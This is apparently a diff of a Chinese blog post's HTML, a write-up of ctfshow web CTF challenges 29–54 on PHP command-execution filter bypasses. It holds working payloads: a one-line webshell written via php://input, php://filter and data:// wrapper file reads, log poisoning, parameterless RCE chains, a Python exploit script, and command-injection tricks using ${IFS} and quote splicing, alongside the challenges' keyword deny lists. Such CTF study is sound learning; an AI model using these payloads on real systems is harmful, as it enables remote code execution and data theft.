@@ -465,7 +465,7 @@ if(isset(">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.9k
+                    4.8k
                 </div>
                 
 
@@ -510,16 +510,12 @@ if(isset($_GET[&#39;c&#39;]))&#123;
     highlight_file(__FILE__);
 &#125;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>传入的变量不能包含flag字符串，太简单了。明显的绕过方法包括但不限于通配符绕过、传入一句话木马绕过、引号拼接、反斜杠flag字符串绕过</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">system(&quot;nl fla?????&quot;);
 system(&quot;nl fla*&quot;);
 echo &#96;nl fl&#39;&#39;ag.php&#96;;
 echo &#96;nl fl\ag.php&#96;;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
 <h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 error_reporting(0);
 if(isset($_GET[&#39;c&#39;]))&#123;
@@ -532,7 +528,6 @@ if(isset($_GET[&#39;c&#39;]))&#123;
     highlight_file(__FILE__);
 &#125;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>在上一关的基础之上多过滤了system、php关键字。可以选择使用别的系统函数。</p>
 <pre class="line-numbers language-none"><code class="language-none">system()
 passthru()
@@ -541,15 +536,11 @@ shell_exec()
 popen()
 proc_open()
 pcntl_exec()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>payload:</p>
 <pre class="line-numbers language-none"><code class="language-none">echo exec(&#39;nl fla?????&#39;);
 echo &#96;nl fla&#39;&#39;g.p&#39;&#39;hp&#96;;
 echo &#96;nl fla?????&#96;;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-
-
 <h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">error_reporting(0);
 if(isset($_GET[&#39;c&#39;]))&#123;
     $c &#x3D; $_GET[&#39;c&#39;];
@@ -560,14 +551,12 @@ if(isset($_GET[&#39;c&#39;]))&#123;
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>过滤了我们一直在使用的单引号，我们可以使用无参数rce，具体地说就是利用php的函数得到点和斜杠，再利用读取文件的函数最终拿到flag。</p>
 <pre class="line-numbers language-none"><code class="language-none">eval($_GET[1]);$1&#x3D;system(&#39;nl flag.php&#39;);
 highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));
 echo(&#96;nl%09fl[abc]*&#96;);
 echo&#96;strings%09f*&#96;;
 echo&#96;strings\$IFS\$9f*&#96;必须加转义字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>strings命令在对象文件或二进制文件中查找可打印的字符串。</p>
 <h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 error_reporting(0);
@@ -580,58 +569,39 @@ if(isset($_GET[&#39;c&#39;]))&#123;
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>第一次见过滤分号的，而且是eval。eval函数将传入的字符串当作php代码执行，而我们都知道php代码不以分号结尾会报错，所以我卡住了。看提示是</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">c&#x3D;include$_GET[&quot;url&quot;]?&gt;&amp;url&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-
 encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
 <p>学到的知识是：include不用括号，分号可以用?&gt;代替（这个应该仅限于php代码只有一句的时候）</p>
-<p>试试php:&#x2F;&#x2F;input伪协议上传一句话木马</p>
+<p>试试php://input伪协议上传一句话木马</p>
 <p>url传参：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">?c&#x3D;include$_GET[&quot;url&quot;]?&gt;&amp;url&#x3D;php:&#x2F;&#x2F;input<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>post传数据:</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[v]);?&gt;&#39;)?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>直接获取webshell！</p>
 <h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p>跟上一题相比就多过滤了一个双引号，payload:</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">?c&#x3D;$nice&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
 <h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p>code:</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(|\:|\&quot;&#x2F;i&quot;, $c))&#123;
         eval($c);
     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
 <p>多过滤了:  payload跟33题一样。。</p>
 <p>payload:</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">?c&#x3D;$nice&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
 <h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p>code:</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(|\:|\&quot;|\&lt;|\&#x3D;&#x2F;i&quot;, $c))&#123;
         eval($c);
     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>太搞了吧？过滤了&#x3D;号，然而有啥用</p>
+<p>太搞了吧？过滤了=号，然而有啥用</p>
 <p>payload：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-
-
 <h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p>code:</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(|\:|\&quot;|\&lt;|\&#x3D;|\&#x2F;|[0-9]&#x2F;i&quot;, $c))&#123;
         eval($c);
     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
 <p>不允许出现数字，还是老payload，简单改一改。</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>所以说，是要告诉我们GET传参可以不用加单引号 双引号是吗？</p>
 <h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><p>code：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">$c &#x3D; $_GET[&#39;c&#39;];
@@ -640,20 +610,17 @@ encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-r
         echo $flag;
     
     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>终于换题目了。。。</p>
-<p>尝试php:&#x2F;&#x2F;input写shell</p>
-<p>url中传入?c&#x3D;php:&#x2F;&#x2F;input</p>
+<p>尝试php://input写shell</p>
+<p>url中传入?c=php://input</p>
 <p>post传参</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[v]);?&gt;&#39;)?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>成功访问，直接拿flag。这题目应该一直打开着allow</p>
 <p>喔，官方题解是</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D;
 data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;nl fla*&quot;);?&gt;
 还可以配合UA头执行日志文件包含
 在UA头中写入我们的PHP一句话木马，然后传参c&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log包含日志<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>嗯，用data伪协议达到执行php代码的效果。</p>
 <p>看到include就要想到filter伪协议跟data伪协议！</p>
 <h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><p>code:</p>
@@ -663,38 +630,24 @@ data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;nl fla*&quot;);?&gt;
         echo $flag;
     
     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>用不了php:&#x2F;&#x2F;input伪协议了，只能用data，跟上题一样的payload</p>
+<p>用不了php://input伪协议了，只能用data，跟上题一样的payload</p>
 <pre class="line-numbers language-none"><code class="language-none">data:&#x2F;&#x2F;text&#x2F;plain;base64,base64的php代码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>如</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;
 也可以日志文件包含<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
-
-
 <h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><p>学到了这题。</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">$c &#x3D; $_GET[&#39;c&#39;];
     if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;
         include($c.&quot;.php&quot;);
     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>尝试%00截断失败了，看提示还是data伪协议，<img src="/../images/1651220785981.png" alt="1651220785981"></p>
+<p>尝试%00截断失败了，看提示还是data伪协议，<img src="images/1651220785981.png" alt="1651220785981"></p>
 <p>payload:</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&#39;cat flag.php&#39;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-
-
 <h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><p>code:</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">$c &#x3D; $_GET[&#39;c&#39;];
     if(!preg_match(&quot;&#x2F;[0-9]|\~|\&#96;|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\&#x3D;|\+|\&#123;|\[|\]|\&#125;|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\&#x2F;|\?|\\\\&#x2F;i&quot;, $c))&#123;
         eval($c);
     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>这题真的学到了。题目小心机，过滤的括号是中文的，实际上英文的括号没有被过滤。</p>
 <p>但是单双引号 + 双斜杠被过滤了，导致前面的payload都不好使了。只能无参数RCE。</p>
 <p>提示说的是GXYCTF禁止套娃，让我们去看看那道题吧。</p>
@@ -710,22 +663,18 @@ if(isset($_GET[&#39;exp&#39;]))&#123;
           
       
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>跟本题真的很像了，过滤了各种php伪协议，第二个if有点难看懂。</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z,_]+\((?R)?\)&#x2F;&#39;, NULL, $_GET[&#39;exp&#39;]))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>?R是引用当前表达式，后面再加上?形成递归调用。</p>
 <p> 也就是说，这里这种代码才能通过匹配 </p>
 <pre class="line-numbers language-none"><code class="language-none">a();
 a(b(c()));
 像下面的这种是不可以的,典型的无参数RCE。：a(&quot;123&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
 <pre class="line-numbers language-none"><code class="language-none">1.需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。
 2.过滤了常用的几个伪协议，不能以伪协议读取文件。
 3.(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。
 4.正则匹配掉了et&#x2F;na&#x2F;info等关键字，很多函数都用不了。
 5：eval($_GET[&#39;exp&#39;]); 典型的无参数RCE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>但是无参数如何通过eval执行系统命令拿flag呢？</p>
 <p>可以通过一些无参的函数作为有参函数的参数来实现。</p>
 <p>3.1 print_r() 输出数组</p>
@@ -734,10 +683,9 @@ phpfile_get_content()
 readfile()
 highlight_file()
 show_source()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>3.2 localeconv()</p>
 <p>返回一个包含本地数字及货币格式信息的数组。</p>
-<p>3.4 current()&#x2F;pos()</p>
+<p>3.4 current()/pos()</p>
 <p>返回数组中的当前单元，默认取第一个值。</p>
 <p>3.4 scandir()</p>
 <p>列出目录中的文件和目录 。</p>
@@ -757,32 +705,27 @@ show_source()<span aria-hidden="true" class="line-numbers-rows"><span></span><sp
 <p>返回数组中的当前元素的值</p>
 <p>所以禁止套娃这一题的payload如下：</p>
 <pre class="line-numbers language-none"><code class="language-none">?exp&#x3D;print_r(scandir(pos(localeconv())));   &#x2F;&#x2F;查看当前目录文件下的存在的数组<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>分析一下这个payload：</p>
-<p>1）localeconv返回一个包含本地数字及货币格式信息的数组。<img src="/../images/1651227195953.png" alt="1651227195953"></p>
+<p>1）localeconv返回一个包含本地数字及货币格式信息的数组。<img src="images/1651227195953.png" alt="1651227195953"></p>
 <p>第一个就是点！！</p>
-<p>然后pos函数取得数组的值<img src="/../images/1651227244289.png" alt="1651227244289"></p>
+<p>然后pos函数取得数组的值<img src="images/1651227244289.png" alt="1651227244289"></p>
 <p>发现了吧，最终scandir函数的参数是点，点代表的就是当前目录，所以scandir列出了当前目录下的文件和目录！</p>
 <pre class="line-numbers language-none"><code class="language-none">readfile(next(array_reverse(scandir(pos(localeconv())))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>将数组颠倒，这样flag.php位于数组第二个位置，然后next函数之后指针指向了flag.php所在位置，最后直接读文件！</p>
 <p>这样也可以</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">show_source(next(array_reverse(scandir(pos(localeconv())))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>但是第一个payload在ctfshow这题居然不行，第二个才可以。但是为什么报同样的警告一个可以执行一个不行？</p>
 <p>上面的太麻烦了，还有更简单的。通过php的session_id(session_start())</p>
 <p>这道题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。使用session之前需要通过session_start()告诉PHP使用session，php默认的是不主动使用session的，session_id()可以获取当前的session_id。</p>
 <p>所以我们手动设置名为PHPSESSID的cookie，并设置为flag.php。</p>
-<p><img src="/../images/1651227949187.png" alt="1651227949187"></p>
+<p><img src="images/1651227949187.png" alt="1651227949187"></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">eval(session_start();system(session_id()));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>传入session_id&#x3D;ls，所以执行system(‘ls’) 。</p>
-<p>总结：无参数RCE &#x3D;&gt; 寻找无参数函数作为有参数函数的参数 或者 通过php的sessionid</p>
+<p>传入session_id=ls，所以执行system(‘ls’) 。</p>
+<p>总结：无参数RCE =&gt; 寻找无参数函数作为有参数函数的参数 或者 通过php的sessionid</p>
 <h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><p>code：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">if(!preg_match(&#39;&#x2F;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x2F;i&#39;, $c))&#123;
         eval(&quot;echo($c);&quot;);
     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
 <p>字母数字都没了。已经蚌埠住了….</p>
 <p>果断看提示: 发现是或运算符。</p>
 <p> 生成可用字符的集合 </p>
@@ -823,8 +766,7 @@ for ($i&#x3D;0; $i &lt; 256; $i++) &#123;
 fwrite($myfile,$contents);
 fclose($myfile);
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p> 大体意思就是<code>从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符</code><br>传递参数getflag<br>用法 <code>python exp.py </code> </p>
+<p> 大体意思就是<code>从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符</code><br>传递参数getflag<br>用法 <code>python exp.py</code> </p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"># -*- coding: utf-8 -*-
 import requests
 import urllib
@@ -866,19 +808,14 @@ while True:
    r&#x3D;requests.post(url,data&#x3D;data)
    print(&quot;\n[*] result:\n&quot;+r.text)
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
 <h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*&#x2F;i&quot;, $c))&#123;
         system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);
     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
 <p>过滤数字+$,不能用%0d $IFS作为命令分隔符  空格，同时禁止了通配符* 。采用标准输入重定向 + ‘’绕过</p>
 <p>payload：</p>
 <pre class="line-numbers language-none"><code class="language-none">nl&lt;fla&#39;&#39;g.php||ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>因为<code>||</code>默认是前面执行成功则不执行后面。</p>
-<p>所以fla’’g.php &#x3D;&#x3D; flag.php ?</p>
+<p>所以fla’’g.php == flag.php ?</p>
 <p>过滤了空格，用<code>%09</code>代替。</p>
 <p>过滤了flag字符串，用<code>fla\g</code>绕过</p>
 <p>最后用<code>%0a</code>换行符阻断后面的<code>&gt;/dev/null 2 &gt;&amp;1</code></p>
@@ -890,13 +827,9 @@ while True:
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>过滤了分号 cat  flag 空格 数字 $ * more less head sort tail ，可以沿用上一题的flag，使用nl命令+标准输入重定向，同时用 ||分隔符阻隔后面的命令</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">?c&#x3D;nl&lt;fla&#39;&#39;g.php||
 ?c&#x3D;nl%09fla\g.php%0a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
 <h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;c&#39;]))&#123;
     $c&#x3D;$_GET[&#39;c&#39;];
     if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\&#96;&#x2F;i&quot;, $c))&#123;
@@ -905,7 +838,6 @@ while True:
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>过滤了分号 cat  flag 空格 数字 $ * more less head sort tail sed cut awk strings od curl 反引号</p>
 <p>跟上一题的payload一致，给一些其他的payload</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">?c&#x3D;nl&lt;fla&#39;&#39;g.php||
@@ -917,7 +849,6 @@ c&#x3D;vi%09fla\g.php%0a
 c&#x3D;tac%09fla\g.php%0a
 c&#x3D;uniq%09fla\g.php%0a
 c&#x3D;nl&lt;fla&#39;&#39;g.php||<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>可以看到linux下能够显示文件内容的命令实战太多了，包括但不限于nl、vi、tac、uniq、</p>
 <h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;c&#39;]))&#123;
     $c&#x3D;$_GET[&#39;c&#39;];
@@ -927,13 +858,9 @@ c&#x3D;nl&lt;fla&#39;&#39;g.php||<span aria-hidden="true" class="line-numbers-ro
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>过滤了分号 cat flag 空格 数字 $ * more less head sort tail sed cut awk strings od curl 反引号 百分号</p>
 <p>跟上题一样的payload</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">?c&#x3D;nl&lt;fla&#39;&#39;g.php||<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
 <h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;c&#39;]))&#123;
     $c&#x3D;$_GET[&#39;c&#39;];
     if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\&#96;|\%|\x09|\x26&#x2F;i&quot;, $c))&#123;
@@ -942,12 +869,8 @@ c&#x3D;nl&lt;fla&#39;&#39;g.php||<span aria-hidden="true" class="line-numbers-ro
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>我们的百分号被过滤了，这导致我们不可以使用<code>%09</code>来代替空格了。但是反斜杠还在，所以还是可以用fla\g绕过flag的限制</p>
 <pre class="line-numbers language-none"><code class="language-none">c&#x3D;nl&lt;fla\g.php||<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
 <h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;c&#39;]))&#123;
     $c&#x3D;$_GET[&#39;c&#39;];
     if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\&#96;|\%|\x09|\x26&#x2F;i&quot;, $c))&#123;
@@ -956,13 +879,9 @@ c&#x3D;nl&lt;fla&#39;&#39;g.php||<span aria-hidden="true" class="line-numbers-ro
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>过滤了分号 cat flag 空格 数字 美元符号 星号 more less head sort tail sed cut tac awk strings od curl 反引号 百分号  \x09 \x26</p>
 <p>payload：</p>
 <pre class="line-numbers language-none"><code class="language-none">?c&#x3D;nl&lt;fla\g.php||<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
 <h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;c&#39;]))&#123;
     $c&#x3D;$_GET[&#39;c&#39;];
     if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;
@@ -971,12 +890,8 @@ c&#x3D;nl&lt;fla&#39;&#39;g.php||<span aria-hidden="true" class="line-numbers-ro
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>糟糕的是过滤了重定向符号以及百分号，这使得我们绕过空格有点麻烦。但是注意到它没有过滤美元符号。所以我们可以用${IFS}来充当空格</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">?c&#x3D;nl$IFS\fla\g.php||<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
 <h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;c&#39;]))&#123;
     $c&#x3D;$_GET[&#39;c&#39;];
     if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;
@@ -989,25 +904,17 @@ c&#x3D;nl&lt;fla&#39;&#39;g.php||<span aria-hidden="true" class="line-numbers-ro
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>过滤了分号 cat flag 空格 数字 星号 more wget less head sort tail sed cut tac awk strings od curl 反引号 百分号 \x09 \x26 大于号 小于号 。</p>
 <p>发现没有过滤美元符号 花括号 ，可以用${IFS}代替空格</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">c&#39;&#39;at$&#123;IFS&#125;fla&#39;&#39;g.p&#39;&#39;hp
 nl$&#123;IFS&#125;fla\g.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
 <h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">if(!preg_match(&quot;&#x2F;\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;
         system($c);
     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
 <p>过滤了分号 同时不能输入形如 ??c??a??t??等字符 这意味着 ca’’t不可以使用了。</p>
 <p>新姿势，记录一下，由于以上的过滤规则，fla’’g.php不好使了，用?操作符绕过，注意长度要跟flag.php这个字符串一样长， 否则读不到</p>
 <p>用绝对路径调用cat命令，并用问号进行模糊匹配打印出flag.php的内容</p>
